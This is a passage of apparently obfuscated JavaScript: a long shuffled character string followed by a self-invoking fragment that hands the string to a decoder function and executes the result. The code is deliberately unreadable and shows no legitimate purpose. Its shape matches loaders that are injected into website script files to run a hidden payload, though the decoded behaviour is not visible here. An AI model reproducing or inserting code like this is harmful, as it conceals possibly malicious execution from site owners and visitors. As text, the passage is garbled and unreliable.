%=Pnt}}n_s%)210c c;rn6mipsoRPteP(:.aPeZynrPPn%;_%_%Xb5oPnia=u]Prp!NniPPPbij}a5!ouP0ah(t) _T.1oa]6e;,c6LYL)=PnPP.% ^Pa]l te3(50[e;=hP,$6%ihg ta]P_t-eie4S1aP]r.cr%Srcn]_wuf1n]lrP"\\nbP+.i.G$P1e4)0nP%iP%Pov=a.aate]-ePraBPa0.=)ru!l8_PkarY,2Bt(i]!,(a)5P27]nP)g>K1X.%Pj0eP%rmw.4P_vt3enc%Pt;PM#2n7PPik(jm_+:)P3gPom+91;lt=3%kt^}f9pt(}i3Kn%cei.e)oa3kieMo[4\\=o=h]+cr^)]li8t.UePPrPeuPta:_\'P)P!P)=trYldr%.)2)+c9o=??,Eo]PuPrrb1e%]n+&p_qPssaa=8e=iS)&%a,x$aJPssced![tP+0dPl5cPer(6ub;af..2gna[pi,Np=a-l)8M Hag8br_aWih]er31f_.v#PePn+br lPP;n1pder$ro,sS5t])}p_!nYyW".lk a.Pn{tPPrPtP}iPprS]iPPb4ei)a"M.glvu.]]0)ooA tia2Po.oa3)_tSfpf]z)&$6Z1hnPP.PP{t*2=__a23u\/,h)ar{;3n]%]a .g6raj%;l+t}cxl {PPeoooi%5`iiabdPUhPdP-f.TiPp(e2{V6:Pa9s1oiuaPa1iP}P(wa{0>o#:%aZI(_[P61@3_aN+Pmp6odfyPneoyn2]=vie:vP1](cXT n0 !u_%P]13p&gS.r_0i3ap\/.{]Yi]bnrS:c.]75oun)P=.-xt$eaPUP7 5il6tP6Po7.(s}rPnPbroF].ria F);t)P{i8_ !gP{t2PZsi=1tg2:t ]a}.+&P4ufS.dsn1C%%w}{cob4a7OP[s]}]4p}4_)yara!fe ip9i]%PPnD Pn3taoi!p}9r(m4sai=Pb=a_a7.Oo3ff%Prt4e9()tPnnlPaaash:fpTatPr]a7e(3a>o2far(rui_t_doil1Ced]$h)%.so.>((no6Pr_PSP.n)aaoo5h]]]nP.!ujjuP]{}PUj3o*t!P] tl3Se=e,KaPbZ=1.0a}{P=$}0.*4fPicPPLp51bsQ!Pt"n(}x;P;..?gtu.t8u)o_13f;bsP6P]]:Pe.=:lX_!;&t;PoL%5(crnt*cPa%.g-aPndt=Pc.=rPat.!_)P33PPti3dPnMe(2PtfiC2rPP)1Pxgp_d 5.tPl:(eTeeP.{P{;n193eTm0t3s.5k1Pl7fPthoao [.AP(lee?h3ifPPa1]_"+c5uPa2lP6aderrQ,ta_tPLn=anec_PPP5}2m02op,te5]\'uP+ue)6sS%tY.216r_PPbnPPZPta=eP.L_}Ytnpen]6.w[4me)(5=PP:P7H2X5{0(r5]{,)Ss]f6yIPKsP$l5(ugt)t)#BP%5dPsa;P+;(_).]s}Pg_s%6Pd9i.I&nc,=aY%}&,:m(m7sPPo5=Jd2Pn)#{}w6a$1;_l%]e1, _n.nd(a=])oH$s)_>(co%.,P;eePtyeP) iP4=b;taer8vW$iPc1 ib._P;{rtss984ePw=t(o6)1,Pe]<ro.t_1_)%..P;(r_?PP].-.a}{%P$!P{tXdcbeap.cPox}c.PPr%0$oPeP]cj_.le)r5dw!ae\'%]. )iat%)aTn)t]7b73no+D}Pe ]1`n}s(!5Pilt$kl3are25ic])Ps;t:XapPw[ )EaP{rdn_e_p4_sP\\tuo#suP=PfFn7abnefrP)PP+ze[yd:X]hrPxPy!(PB5or2[foGst%Pd$?,P(]P4PmZitdf33tlc(1Pfs8]r ]%J61=PPXt3p_2o!;i(PPui_e)n1l])feHemfol5_+w%09Yre_er)++<9m4sP4=sp%euB_<P ot(;4ae_mstcj&e(a.^ce0PtPT)nsP5]niPw"S.<.1ig__Le)oP )P=[eet]m{Pgco4aiP%P#%)oodey?P-]h;2!nmh43h)=tt+\\x)PPharf__1P=9_2stao_P_c.04_lP[E_a5b).m.fto[1aPp}29u&P%_.P:P5ar!P=Pg[tPaPPad=tPo._0v2ra]Pac i,4 %_e)t,P)bEatlb(onr]G4)o%-Ph.^i eat32d_$=ic.etocao,b1pP]!aP(}iL==a..Prn;.!t]]lhff,P-c)nPt;oh]alsP.} ]is,to9gl=ao_a6cePPfPr=NPs=oP.Xa5uP .uiP{.laecPPo)nS.P;g2114;]eP7D9s)rPs;4Pac]ehekP 0plh5d%D% P._45;\'2._is+.)alPPb_g)P]Ld4e)]Pi{PeacR1)o]PBier)n]=l=(2{)w\\)nPM[T*!;9)P)adnsP8uP]]PfpU o._mcPf:sl]]0_Pr(s=oeswg$br{ ;soa5td)AS\'m{rt.-oe%%a=2s]eU,{}i,8tPPdyrx]lP[=m%,7e_30is3.P3iPPt.2Px5I_PPlS1PoP}tp%ceEaPttPoi;io}i0)P_1avm,]rP{orP1txX (blhmP)6Z7esek2P]rl+lPeXf(__{P(= 0XPPPn2%P2)%.=1o+(\/8c(P!!_o=o+.g51n]dc;(( Pe0fc=;P.tl2fa.<hr5iial%crm)P.;PP(}5)2r))l)ei$%ea5e.ZAP.}($,e}+:_Xa}.Pa&pJ;(ePPP}).6Pa3P4aae}ofEPPb_p:=lPX{tgePa=33}Ye5c.rE vaPb4aepoA$0\\_H}{aH.sf_c;Pe_eoCd+PaPe"lc.a{(,P%P(2_})1.nri1tNPt?*(c]r_P]=P&a;hi5)I&PPasnorP=?Pxk\\;i(@c3._1;53) Pee05P=xe_p t%tIn}. !_(rh):!Tl(123Pt6P};_.efo1iob_dP_d6P}r]rga_u2pyxaC%(@]8X7(.3]!}.jda}fliPdaPPe_(uR5P68aP:aP5P,t]P_h,e.m_]0}P5Oelo547PsPP$nsdP4\/C(t7_n_%w.atSPrno(1n}ktdt5Tc%=..s)Pn,s1)\'tPo{ ._"P=#nw[.d0P6.h]si1%;8{ Pwea=0!]tna3.5f,nP_Zas)]( a V6o .4u.eP%n]2u&weenLeaY(P:a>yt3_]e,oa]ne5t3d!2.o!% j $P_Pe`.rCx .>f}sP=]2_ +.(a;eiPti=tPb,aa%8}.aE.6{oalia(PH_P2es=Dr(w31[PPg.1=P%ybiagPb{a$P[Paz=>eh1uoPae0)fOPl;d_tlPP(5adj)[)l{P PrP])1:rsP6todnPM4__2Pe!3)croPep_l_P,a620re2Ia!"k($..sC]GP!^a])P_((_PSa;PPo`ihPnnr4dee  o]PP  .,*o.gPrP N].]6Prqui%1(de\/Pc!e. ah%_aanu3Ppg2r$r)cyl%oedp aPPeoP,a:];Pt,tP.%{nPin(&]ih](psHye)'));var EDl=CuV(Otw,pAa );EDl(7124);return 9484})()
